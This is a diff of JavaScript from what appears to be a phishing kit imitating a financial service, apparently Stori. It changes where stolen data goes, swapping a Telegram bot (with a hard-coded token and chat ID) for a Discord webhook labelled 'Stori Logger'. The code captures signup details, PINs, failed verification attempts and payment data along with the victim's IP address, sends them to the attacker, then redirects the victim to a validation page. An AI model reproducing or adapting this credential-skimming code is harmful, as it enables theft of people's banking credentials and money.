@@ -1,6 +1,5 @@
-// Configuración común
-const botToken = "8180911711:AAHdzE-GdHoES_Da5767677XMxTgmVyBaCoqo";
-const chatId = "-4954657566809";
+// Configuración común - DISCORD
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0';
 
 // Función para obtener IP
 async function getIP() {
@@ -14,26 +13,22 @@ async function getIP() {
   }
 }
 
-// Función para enviar a Telegram
-async function sendToTelegram(message) {
+// Función para enviar a Discord
+async function sendToDiscord(message) {
   try {
-    const response = await fetch(
-      `https://api.telegram.org/bot${botToken}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      }
-    );
+    const response = await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        username: "Stori Logger",
+        content: message,
+      }),
+    });
     return await response.json();
   } catch (error) {
-    console.error("Error al enviar a Telegram:", error);
+    console.error("Error al enviar a Discord:", error);
     return { ok: false };
   }
 }
@@ -58,7 +53,7 @@ if (document.getElementById("signup-form")) {
 🕒 Fecha: ${new Date().toLocaleString()}
         `;
 
-      await sendToTelegram(message);
+      await sendToDiscord(message);
       window.location.href = "validacion.html";
     });
 }
@@ -76,7 +71,7 @@ if (document.getElementById("pin-form")) {
 🕒 Fecha: ${new Date().toLocaleString()}
         `;
 
-    await sendToTelegram(message);
+    await sendToDiscord(message);
   });
 }
 
@@ -93,7 +88,7 @@ document.addEventListener("pinErrorCompleted", async function (e) {
 ⚠️ Intento de verificación fallido
     `;
 
-  await sendToTelegram(message);
+  await sendToDiscord(message);
 });
 
 // Manejar envío desde payment.html
@@ -112,5 +107,5 @@ document.addEventListener("paymentCompleted", async function (e) {
 🕒 Fecha: ${new Date().toLocaleString()}
     `;
 
-  await sendToTelegram(message);
+  await sendToDiscord(message);
 });
